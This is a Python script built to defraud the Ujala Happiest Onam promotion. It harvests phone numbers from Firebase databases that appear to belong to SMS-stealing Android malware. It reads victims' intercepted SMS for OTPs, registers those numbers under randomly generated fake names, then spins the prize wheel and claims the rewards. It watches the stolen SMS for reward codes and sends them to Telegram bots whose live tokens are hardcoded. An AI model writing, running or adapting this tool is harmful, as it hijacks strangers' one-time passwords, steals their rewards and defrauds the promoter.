"""
Ujala Happiest Onam - ULTRA PRO v9
ONLY YOUR PANELS + MONITOR SYSTEM
"""

import requests
import json
import base64
import hmac
import hashlib
import random
import string
import time
import urllib.parse
import os
import re
import threading
import tempfile
import asyncio
import aiohttp
from pathlib import Path
from typing import Optional, Dict, List
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ═══════════════════════════════════════════════════════════════
# YOUR DETAILS
# ═══════════════════════════════════════════════════════════════

# Bot 1 - Main script bot
BOT_TOKEN_MAIN = "8853806673:AAFVyFRMbBb--p8utUKxGPImFSCRnd6AAt8"

# Bot 2 - Reward SMS notification bot
BOT_TOKEN_REWARD = "8841593698:AAFucNhM325wguWpdk-lFK6XI6tptwVzJIg"

CHAT_ID = "8403468945"
ADMIN_PHONE = "7298987017"

TELEGRAM_API_MAIN = f"https://api.telegram.org/bot{BOT_TOKEN_MAIN}"
TELEGRAM_API_REWARD = f"https://api.telegram.org/bot{BOT_TOKEN_REWARD}"

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════

BASE_URL = "https://www.ujalahappiestonam.com/api/users"
MASTER_KEY = "660395654"
IMGBB_URL = "https://ibb.co/279sXQrK"
OTP_WAIT_TIME = 40  # 🔥 40 SECONDS OTP WAIT
MAX_WORKERS = 30

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://www.ujalahappiestonam.com",
    "Referer": "https://www.ujalahappiestonam.com/",
})

# ═══════════════════════════════════════════════════════════════
# 🔥 ONLY YOUR PANELS
# ═══════════════════════════════════════════════════════════════

ALL_PANELS = [
    # From Ram Choudhary
    "https://rto8-7f24f-default-rtdb.firebaseio.com",
    "https://admin-panel-clients-default-rtdb.firebaseio.com",
    "https://mpriwan13-default-rtdb.firebaseio.com",
    "https://miyakhalifa-143d5-default-rtdb.firebaseio.com",
    
    # From Adnan (Aadi)
    "https://admin-panel-client-a3ee5-default-rtdb.firebaseio.com",
    "https://myapp-8228a-default-rtdb.firebaseio.com",
    
    # From Death Crushes
    "https://annu-f0207-default-rtdb.firebaseio.com",
    "https://babayou-ca160-default-rtdb.firebaseio.com",
    "https://kalui-a8e2b-default-rtdb.firebaseio.com",
    "https://strboii-default-rtdb.firebaseio.com",
    "https://romini-57831-default-rtdb.firebaseio.com",
    "https://rajkumar-a67fb-default-rtdb.firebaseio.com",
    "https://neha-2e45d-default-rtdb.firebaseio.com",
    
    # ZXKAI Panels
    "https://zxkaiz.vercel.app/?s=IXo-Y3NUWSssG0pXfx0aPBoQIFsYNwdHLFYFJ00VIBwoFiFXXSBDUDt1OC48Alk6ORhNXH5UHjxSEy1HEzZXHilRAjVdVzVBKkBpFxhjChsbNDEgGg9wDy4YCwklVB0JfzcLXycKWx4BHhV0Cjo6RjhRaERDMQQbdnonY3NUEyI",
    "https://zxkaiz.vercel.app/?s=IXo-Y3NUWSssG0pXfx0HI1wQIBlBYFIIex4HI14YIV0uTzdBFyMeXzMqLiMoBVQ2N0VaAj0QW2xcU3YWHiZCGjsJTGlIFD9QNk9yBxcjAxQ-PS0gPBpFciofXQ9-VB48UhMtRxM7WUQrXA5kFFs4E2BAZ0g",
    "https://zxkaiz.vercel.app/?s=IXo-Y3NUWSssG0pXfx0EOkUQIlMTfwQPfFICa1wcMlAvDjEYATVUW3Q-IjMsFFAsPQJWQzNdGmwbUycWTHBeHjxDEHwXVidFKAMrUhZsAlxuOSpsLRNXPi0HTUAiRhMsGRclRhMwVxktWgxoWxY5E3ZAKRdJYxJE",
]

PANELS = list(set(ALL_PANELS))
DATABASES = {f"DB_{i+1}": url for i, url in enumerate(PANELS)}

print(f"✅ Loaded {len(DATABASES)} panels")
print(f"📁 Panels: {list(DATABASES.keys())}")

# ═══════════════════════════════════════════════════════════════
# TELEGRAM - TWO BOTS
# ═══════════════════════════════════════════════════════════════

def send_telegram_main(text: str):
    """Send to main bot (script bot)"""
    try:
        payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
        requests.post(f"{TELEGRAM_API_MAIN}/sendMessage", json=payload, timeout=5)
    except: pass

def send_telegram_reward(text: str):
    """Send to reward bot (for SMS rewards)"""
    try:
        payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
        requests.post(f"{TELEGRAM_API_REWARD}/sendMessage", json=payload, timeout=5)
    except: pass

def send_telegram_safe(text: str):
    """Fire-and-forget using main bot"""
    try:
        threading.Thread(target=send_telegram_main, args=(text,), daemon=True).start()
    except: pass

def send_reward_alert(text: str):
    """Send reward alert using reward bot"""
    try:
        threading.Thread(target=send_telegram_reward, args=(text,), daemon=True).start()
    except: pass

# ═══════════════════════════════════════════════════════════════
# IMAGE DOWNLOAD
# ═══════════════════════════════════════════════════════════════

def download_image():
    try:
        r = requests.get(IMGBB_URL, timeout=10)
        if r.status_code == 200:
            tmp_path = os.path.join(tempfile.gettempdir(), "ujala_pack.jpg")
            with open(tmp_path, 'wb') as f:
                f.write(r.content)
            return tmp_path
    except: pass
    return None

# ═══════════════════════════════════════════════════════════════
# UJALA CRYPTO
# ═══════════════════════════════════════════════════════════════

def generate_signature_data(payload: dict, user_key: str, data_key: str) -> str:
    payload_str = json.dumps(payload, separators=(',', ':'))
    a = base64.b64encode(payload_str.encode()).decode()
    ts = str(payload['t'])
    u = base64.b64encode(ts.encode()).decode()
    hmac_key = data_key[4:18].encode()
    message = f"{u}.{a}".encode()
    h = hmac.new(hmac_key, message, hashlib.sha256)
    hex_sig = h.hexdigest()
    f = base64.b64encode(hex_sig.encode()).decode()
    m = random.randint(1, 6)
    k = random.randint(2, 8)
    alphabet = string.ascii_letters + string.digits
    h_rand = "".join(random.choice(alphabet) for _ in range(k))
    g = f"{k}{m}{f[0:m]}{h_rand}{f[m:]}"
    return f"{u}.{a}.{g}"

def decrypt_resp(encrypted: str):
    try:
        return json.loads(base64.b64decode(encrypted).decode()), True
    except:
        return {"error": "decrypt_failed"}, False

def get_timestamp():
    return int(time.time() * 1000)

# ═══════════════════════════════════════════════════════════════
# UJALA API - FIXED
# ═══════════════════════════════════════════════════════════════

def create_user():
    """Create user with better error handling"""
    try:
        r = session.post(f"{BASE_URL}", json={"masterKey": MASTER_KEY}, timeout=15)
        if r.status_code != 200:
            print(f"   ❌ Create user HTTP error: {r.status_code}")
            return None, None
        data = r.json()
        decoded, ok = decrypt_resp(data.get("resp", ""))
        if not ok or decoded.get("statusCode") != 200:
            print(f"   ❌ Create user failed: {decoded.get('statusCode', 'unknown')}")
            return None, None
        return str(decoded["userKey"]), decoded["dataKey"]
    except Exception as e:
        print(f"   ❌ Create user error: {e}")
        return None, None

def send_otp(user_key, data_key, name, mobile, code, image_path):
    """Send OTP with better error handling"""
    if not os.path.exists(image_path):
        print(f"   ❌ Image not found: {image_path}")
        return False
    try:
        t = get_timestamp()
        payload = {
            "name": name, "mobile": mobile, "email": "", "city": "Kerala",
            "code": code, "agreed1": "Yes", "agreed2": "Yes",
            "userKey": int(user_key), "t": t
        }
        data_value = generate_signature_data(payload, user_key, data_key)
        files = {"pack": ("pack.jpg", open(image_path, "rb"), "image/jpeg")}
        form_data = {"t": str(t), "userKey": user_key, "data": data_value}
        r = session.post(f"{BASE_URL}/getOTP/{user_key}?t={t}", data=form_data, files=files, timeout=20)
        files["pack"][1].close()
        if r.status_code != 200:
            print(f"   ❌ OTP send HTTP error: {r.status_code}")
            return False
        decoded, ok = decrypt_resp(r.json().get("resp", ""))
        if ok and decoded.get("statusCode") == 200:
            return True
        print(f"   ❌ OTP send failed: {decoded.get('statusCode', 'unknown')}")
        return False
    except Exception as e:
        print(f"   ❌ OTP send error: {e}")
        return False

def verify_otp(user_key, data_key, otp):
    try:
        t = get_timestamp()
        payload = {"otp": otp, "userKey": int(user_key), "t": t}
        data_value = generate_signature_data(payload, user_key, data_key)
        u, a, g = data_value.split(".", 2)
        body = f"userKey={user_key}&data={urllib.parse.quote_plus(u)}.{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}"
        r = session.post(f"{BASE_URL}/verifyOTP/{user_key}?t={t}", data=body,
            headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"}, timeout=15)
        if r.status_code != 200:
            return None
        decoded, ok = decrypt_resp(r.json().get("resp", ""))
        if ok and decoded.get("statusCode") == 200:
            return decoded.get("token")
        return None
    except Exception as e:
        print(f"   ❌ Verify OTP error: {e}")
        return None

def spin_wheel(user_key, data_key, token):
    try:
        t = get_timestamp()
        payload = {"userKey": int(user_key), "t": t}
        data_value = generate_signature_data(payload, user_key, data_key)
        u, a, g = data_value.split(".", 2)
        body = f"userKey={user_key}&data={urllib.parse.quote_plus(u)}.{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}"
        headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f"Bearer {token}"}
        r = session.post(f"{BASE_URL}/speenTheWheel/{user_key}?t={t}", data=body, headers=headers, timeout=15)
        if r.status_code != 200:
            return None
        decoded, ok = decrypt_resp(r.json().get("resp", ""))
        if ok and decoded.get("statusCode") == 200:
            return decoded.get('reward', 'Unknown')
        return None
    except Exception as e:
        print(f"   ❌ Spin error: {e}")
        return None

def claim_reward(user_key, data_key, token):
    try:
        t = get_timestamp()
        payload = {"userKey": int(user_key), "t": t}
        data_value = generate_signature_data(payload, user_key, data_key)
        u, a, g = data_value.split(".", 2)
        body = f"userKey={user_key}&data={urllib.parse.quote_plus(u)}.{urllib.parse.quote_plus(a)}.{urllib.parse.quote_plus(g)}"
        headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f"Bearer {token}"}
        r = session.post(f"{BASE_URL}/claimNow/{user_key}?t={t}", data=body, headers=headers, timeout=15)
        if r.status_code != 200:
            return False
        decoded, ok = decrypt_resp(r.json().get("resp", ""))
        if ok and decoded.get("statusCode") == 200:
            return True
        return False
    except Exception as e:
        print(f"   ❌ Claim error: {e}")
        return False

# ═══════════════════════════════════════════════════════════════
# 🔥 YOGA BOT FETCHING SYSTEM
# ═══════════════════════════════════════════════════════════════

_http_session = None
dead_panels = set()
panel_lock = threading.Lock()

async def get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=200, keepalive_timeout=10)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

def extract_numbers_yoga(*dicts) -> List[str]:
    nums = []
    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2", "mobNo", "phoneNumber", "phone", "mobile"]
    for d in dicts:
        if not isinstance(d, dict): continue
        for k in keys_to_check:
            val = str(d.get(k, ""))
            if val and len(re.sub(r"\D", "", val)) > 9:
                clean = re.sub(r"\D", "", val)
                if len(clean) >= 10: nums.append(clean[-10:])
    return list(set(nums))

async def fb_get(path: str, base: str) -> Optional[dict]:
    if base in dead_panels: return None
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
            if r.status != 200: return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception: return None

async def fetch_db_data(tag: str, url: str) -> list:
    devices_list = []
    try:
        sim_all, device_info_all, user_data_all = await asyncio.gather(
            fb_get("All_Users/simDetails", url), 
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url), return_exceptions=True
        )
        if isinstance(sim_all, dict):
            info_all = device_info_all if isinstance(device_info_all, dict) else {}
            for dev_id, sim in sim_all.items():
                info = info_all.get(dev_id) or {}
                nums = extract_numbers_yoga(sim, info)
                status = "online" if str(info.get("Status")).lower() == "online" else "offline"
                devices_list.append({
                    "id": dev_id, 
                    "numbers": nums, 
                    "status": status, 
                    "base": url, 
                    "path": f"All_Users/sms/{dev_id}"
                })
                
        if isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if not isinstance(data, dict): continue
                nums = extract_numbers_yoga(data)
                status = "online" if str(data.get("status")).lower() == "online" else "offline"
                devices_list.append({
                    "id": dev_id, 
                    "numbers": nums, 
                    "status": status, 
                    "base": url, 
                    "path": f"user_sms/{dev_id}"
                })
    except Exception:
        dead_panels.add(url)
    return devices_list

async def fetch_all_panels_fast() -> List[dict]:
    print("\n" + "="*60)
    print(" 🔥 FETCHING ONLINE DEVICES FROM PANELS")
    print("="*60)
    
    start_time = time.time()
    active_panels = []
    
    tasks = [fetch_db_data(tag, url) for tag, url in DATABASES.items()]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for idx, res in enumerate(results):
        if isinstance(res, list):
            tag = list(DATABASES.keys())[idx]
            url = list(DATABASES.values())[idx]
            online_devices = [d for d in res if d.get("status") == "online" and d.get("numbers")]
            
            if online_devices:
                total_numbers = sum(len(d["numbers"]) for d in online_devices)
                active_panels.append({
                    "tag": tag,
                    "url": url,
                    "devices": online_devices,
                    "total_numbers": total_numbers
                })
                print(f" ✅ [{tag}] {total_numbers} numbers | {len(online_devices)} devices")
    
    elapsed = time.time() - start_time
    total_numbers = sum(p["total_numbers"] for p in active_panels)
    print(f"\n 📊 Fetched {len(active_panels)} active panels in {elapsed:.1f}s")
    print(f" 📱 Total online numbers: {total_numbers}")
    
    send_telegram_safe(f"⚡ <b>Fetch Complete</b>\n⏱️ {elapsed:.1f}s\n📱 {len(active_panels)} panels\n📊 {total_numbers} numbers")
    
    return active_panels

# ═══════════════════════════════════════════════════════════════
# SMS OTP FETCHING - 40 SECONDS
# ═══════════════════════════════════════════════════════════════

def fetch_otp_from_sms(panel_url, device_id, timeout=OTP_WAIT_TIME):
    """Fetch OTP from SMS - waits up to 40 seconds"""
    existing_keys = set()
    try:
        initial = requests.get(f"{panel_url}/All_Users/sms/{device_id}.json", timeout=5)
        if initial.status_code == 200 and initial.json():
            existing_keys = set(initial.json().keys())
    except: pass
    
    start_time = time.time()
    print(f" 🔍 Polling SMS for device: {device_id} (max {timeout}s)")
    
    while time.time() - start_time < timeout:
        try:
            resp = requests.get(f"{panel_url}/All_Users/sms/{device_id}.json", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if data and isinstance(data, dict):
                    for sms_key, sms_value in data.items():
                        if sms_key not in existing_keys and isinstance(sms_value, dict):
                            body = str(sms_value.get("body") or sms_value.get("message") or sms_value.get("text") or "")
                            # Check for OTP patterns
                            patterns = [
                                r'Your OTP to register is (\d{6})',
                                r'OTP is (\d{6})',
                                r'Your OTP (\d{6})',
                                r'OTP:?\s*(\d{6})',
                                r'verification code is (\d{6})',
                                r'(\d{6})\s+is your OTP',
                                r'(\d{6})\s+OTP',
                            ]
                            for pattern in patterns:
                                match = re.search(pattern, body, re.IGNORECASE)
                                if match:
                                    otp = match.group(1)
                                    print(f" ✅ OTP found: {otp}")
                                    return otp
                            # Generic 6-digit with Ujala/BigCity
                            if any(k in body for k in ['Ujala', 'BigCity', 'Onam', 'register']):
                                match = re.search(r'\b(\d{6})\b', body)
                                if match:
                                    otp = match.group(1)
                                    print(f" ✅ OTP found: {otp}")
                                    return otp
                            existing_keys.add(sms_key)
        except: pass
        time.sleep(0.5)
    print(f" ❌ OTP not found within {timeout}s")
    return None

# ═══════════════════════════════════════════════════════════════
# 🔥 MONITOR SYSTEM - REWARD SMS DETECTION
# ═══════════════════════════════════════════════════════════════

def start_reward_monitor(panel_url, device_id, mobile, reward, duration=600):
    """Background thread: monitor SMS for reward codes"""
    print(f"\n 🔍 [MONITOR] {mobile} | Monitoring for rewards ({duration//60} min)")
    send_reward_alert(f"🔍 <b>Monitor Started</b>\n📱 <code>{mobile}</code>\n🎁 {reward}\n⏱️ {duration//60} min")
    
    existing_keys = set()
    try:
        initial = requests.get(f"{panel_url}/All_Users/sms/{device_id}.json", timeout=5)
        if initial.status_code == 200 and initial.json():
            existing_keys = set(initial.json().keys())
    except: pass
    
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            resp = requests.get(f"{panel_url}/All_Users/sms/{device_id}.json", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if data and isinstance(data, dict):
                    for sms_key, sms_value in data.items():
                        if sms_key not in existing_keys:
                            if isinstance(sms_value, dict):
                                body = str(sms_value.get("body") or sms_value.get("message") or sms_value.get("text") or "")
                                sender = str(sms_value.get("sender") or "")
                                
                                # 🔥 REWARD CODE DETECTION
                                reward_match = re.search(r'Reward Code[^:]*:\s*([A-Za-z0-9]+)', body, re.IGNORECASE)
                                if reward_match:
                                    code = reward_match.group(1)
                                    alert = f"🎁 <b>REWARD CODE!</b>\n📱 <code>{mobile}</code>\n🔑 <code>{code}</code>\n💬 {body[:300]}"
                                    print(f"\n 🎁 [MONITOR] {mobile}: {code}")
                                    send_reward_alert(alert)
                                
                                # 🔥 50RS HIT or Cashback detection
                                if 'cashback' in body.lower() or '50rs' in body.lower() or '50 rs' in body.lower():
                                    alert = f"💰 <b>CASHBACK/50RS!</b>\n📱 <code>{mobile}</code>\n💬 {body[:300]}"
                                    print(f"\n 💰 [MONITOR] {mobile}: CASHBACK SMS!")
                                    send_reward_alert(alert)
                                
                                # 🔥 Ujala/BigCity/Onam specific
                                if any(k in body for k in ['Ujala', 'BigCity', 'Onam', 'happiestonam']):
                                    # Check for codes
                                    code_match = re.search(r'([A-Z0-9]{8,})', body)
                                    if code_match and len(code_match.group(1)) >= 8:
                                        code = code_match.group(1)
                                        alert = f"📩 <b>Ujala SMS</b>\n📱 <code>{mobile}</code>\n🔑 <code>{code}</code>\n💬 {body[:300]}"
                                        print(f"\n 📩 [MONITOR] {mobile}: {code}")
                                        send_reward_alert(alert)
                                    else:
                                        alert = f"📩 <b>Ujala SMS</b>\n📱 <code>{mobile}</code>\n💬 {body[:300]}"
                                        print(f"\n 📩 [MONITOR] {mobile}: {body[:100]}")
                                        send_reward_alert(alert)
                                
                                existing_keys.add(sms_key)
        except: pass
        time.sleep(3)
    
    print(f"\n ⏰ [MONITOR] Done for {mobile}")
    send_reward_alert(f"⏰ <b>Monitor Done</b>\n📱 <code>{mobile}</code>")

# ═══════════════════════════════════════════════════════════════
# PROCESS NUMBER - FULL AUTO
# ═══════════════════════════════════════════════════════════════

def process_number_full(mobile, name, code, image_path, panel_url, device_id, idx, total):
    print(f"\n[{idx}/{total}] 📱 {mobile} | {name}")
    
    # Step 1: Create user
    user_key, data_key = create_user()
    if not user_key:
        print(f" ❌ User creation failed")
        return None
    
    # Step 2: Send OTP
    if not send_otp(user_key, data_key, name, mobile, code, image_path):
        print(f" ❌ OTP send failed")
        return None
    print(f" ✅ OTP sent, waiting {OTP_WAIT_TIME}s...")
    
    # Step 3: Fetch OTP from SMS (40 seconds)
    otp = fetch_otp_from_sms(panel_url, device_id, timeout=OTP_WAIT_TIME)
    if not otp:
        print(f" ❌ OTP timeout")
        return None
    
    # Step 4: Verify OTP
    token = verify_otp(user_key, data_key, otp)
    if not token:
        print(f" ❌ Verify failed")
        return None
    print(f" ✅ Verified!")
    
    # Step 5: Spin
    reward = spin_wheel(user_key, data_key, token)
    if not reward:
        print(f" ❌ Spin failed")
        return None
    
    # Step 6: Claim
    if claim_reward(user_key, data_key, token):
        print(f" ✅✅✅ SUCCESS! {reward}")
        send_telegram_safe(f"🎉 <b>SUCCESS!</b>\n📱 <code>{mobile}</code>\n🎁 <b>{reward}</b>\n👤 {name}")
        
        # 🔥 Start monitor for reward SMS (if cashback detected)
        if 'cashback' in reward.lower() or '50' in reward:
            print(f" 💰 CASHBACK detected! Starting 10-min monitor...")
            threading.Thread(
                target=start_reward_monitor,
                args=(panel_url, device_id, mobile, reward, 600),
                daemon=True
            ).start()
        
        return {"number": mobile, "reward": reward, "name": name, "status": "Success"}
    else:
        print(f" ⚠️ Claim failed")
        return None

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

async def async_main():
    print("="*60)
    print(" 🎡 UJALA ULTRA PRO v9 — YOUR PANELS ONLY")
    print("="*60)
    print(f"🤖 Main Bot: @UjalaMainBot")
    print(f"📢 Reward Bot: @UjalaRewardBot")
    print(f"📡 Panels: {len(DATABASES)}")
    print(f"⏱️ OTP Wait: {OTP_WAIT_TIME}s")
    print("="*60)
    
    image_path = download_image()
    if not image_path:
        print("❌ Image download failed")
        return
    
    code = input("📦 Product code (default: 8902102126232): ").strip()
    if not code:
        code = "8902102126232"
    
    send_telegram_safe(f"🚀 <b>Ujala Ultra Pro Started</b>\n📦 {code}\n⏱️ {OTP_WAIT_TIME}s OTP wait")
    
    # 🔥 FETCH ONLINE DEVICES
    active_panels = await fetch_all_panels_fast()
    
    if not active_panels:
        print("\n❌ No active panels found!")
        send_telegram_safe("❌ No active panels found")
        return
    
    # Prepare all numbers
    all_numbers = []
    for panel in active_panels:
        for device in panel["devices"]:
            for mobile in device["numbers"]:
                all_numbers.append({
                    "mobile": mobile,
                    "panel_url": panel["url"],
                    "device_id": device["id"]
                })
    
    print(f"\n 📊 Total numbers to process: {len(all_numbers)}")
    send_telegram_safe(f"📊 Processing {len(all_numbers)} numbers...")
    
    first_names = ["Aarav", "Vivaan", "Aditya", "Vihaan", "Arjun", "Sai", "Reyansh", "Ayaan",
                   "Ananya", "Aadhya", "Diya", "Myra", "Sara", "Anika", "Pari", "Aarohi", "Kiara"]
    last_names = ["Nair", "Menon", "Pillai", "Kurup", "Nambiar", "Warrier", "Panicker", "Thampi", "Varma"]
    
    results = []
    success_count = 0
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for idx, item in enumerate(all_numbers, 1):
            name = f"{random.choice(first_names)} {random.choice(last_names)}"
            future = executor.submit(
                process_number_full,
                item["mobile"], name, code, image_path,
                item["panel_url"], item["device_id"], idx, len(all_numbers)
            )
            futures.append(future)
        
        for future in as_completed(futures):
            try:
                result = future.result(timeout=90)
                if result:
                    results.append(result)
                    success_count += 1
                    print(f"\n🎯 Total Success: {success_count}")
            except Exception as e:
                print(f" ⚠️ Error: {e}")
    
    print("\n" + "="*60)
    print(" 🏁 FINAL SUMMARY")
    print("="*60)
    print(f"📱 Total: {len(all_numbers)}")
    print(f"✅ Success: {success_count}")
    print(f"❌ Failed: {len(all_numbers) - success_count}")
    print("="*60)
    
    if results:
        print("\n🎉 Winners:")
        for r in results[:20]:
            print(f"   📱 {r['number']} → {r['reward']} ({r['name']})")
    
    send_telegram_safe(f"🏁 <b>FINAL</b>\n📱 {len(all_numbers)}\n✅ {success_count}\n❌ {len(all_numbers) - success_count}")

def main():
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        print("\n\n 🛑 Stopped")
        send_telegram_safe("🛑 <b>Script stopped</b>")
    except Exception as e:
        print(f"\n💥 Error: {e}")
        send_telegram_safe(f"💥 <b>Error</b>\n<code>{str(e)[:200]}</code>")

if __name__ == "__main__":
    main()
